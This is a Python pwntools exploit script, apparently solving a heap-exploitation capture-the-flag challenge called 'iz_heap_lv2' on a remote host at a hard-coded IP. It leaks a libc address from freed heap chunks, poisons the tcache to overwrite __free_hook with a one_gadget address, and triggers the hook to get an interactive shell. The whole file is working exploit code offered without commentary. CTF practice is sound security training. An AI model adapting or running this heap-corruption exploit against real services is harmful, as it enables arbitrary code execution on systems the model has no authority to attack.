from pwn import *

context.log_level = 'debug'
#r = process('./iz_heap_lv2')
r = remote('165.22.110.249', 4444)
#gdb.attach(r)

libc = ELF('./libc.so.6')
malloc_hook_offset = libc.symbols['__malloc_hook']
free_hook_offset = libc.symbols['__free_hook']
one_gadget = [0x4f2c5,0x4f322,0x10a38c][1]

rr = lambda x: r.recvuntil(str(x))
ii = lambda x,y: r.sendlineafter(str(x),str(y))

def add(size, data):
    ii(': ', 1)
    ii(': ', size)
    ii(': ', data)

def edit(idx, data):
    ii(': ', 2)
    ii(': ', idx)
    ii(': ', data)

def delete(idx):
    ii(': ', 3)
    ii(': ', idx)

def show(idx):
    ii(': ', 4)
    ii(': ', idx)
    return (rr(': '), rr('\n'), rr('\n'))[-1]

for i in range(8):
    add(0x80, 'a')

for i in range(8):
    delete(7-i)

add(0x71, 'a'*7)
leak = u64(((show(0))[:-1]).ljust(8, '\x00'))
libc_base = leak - 224 - 0x10 - malloc_hook_offset
libc_1shot = libc_base + one_gadget
libc_free_hook = libc_base + free_hook_offset

add(0x71, 'a')
add(0x6020f0, 'a')
delete(22)

add(0x80, 'a')
add(0x60, 'a'*8 + '\x00')
edit(3, 'a'*0x90 + p64(libc_free_hook))

add(0x80, 'a')
add(0x80, p64(libc_1shot))

delete(0)

r.interactive()

